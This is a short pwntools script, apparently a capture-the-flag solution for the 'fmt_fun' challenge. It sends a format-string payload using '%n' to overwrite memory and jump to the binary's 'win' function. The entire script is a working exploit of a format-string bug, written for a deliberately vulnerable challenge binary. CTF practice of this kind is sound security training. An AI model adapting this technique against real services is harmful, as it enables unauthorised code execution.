from pwn import *

context.binary = elf = ELF("./fmt_fun")
libc = ELF("./libc.so.6")
#conn = elf.process()
conn = remote("fmt-fun.chal.imaginaryctf.org", 1337)

conn.clean()

offset = elf.sym.buf - 0x403db8 + 32

payload = b""
payload += f"%{offset}c".encode()
payload += b"%26$n"
payload += b"a"*(32-len(payload))
payload += p64(elf.sym.win)

#gdb.attach(conn)

conn.sendline(payload)

conn.recvuntil("@")
conn.stream()
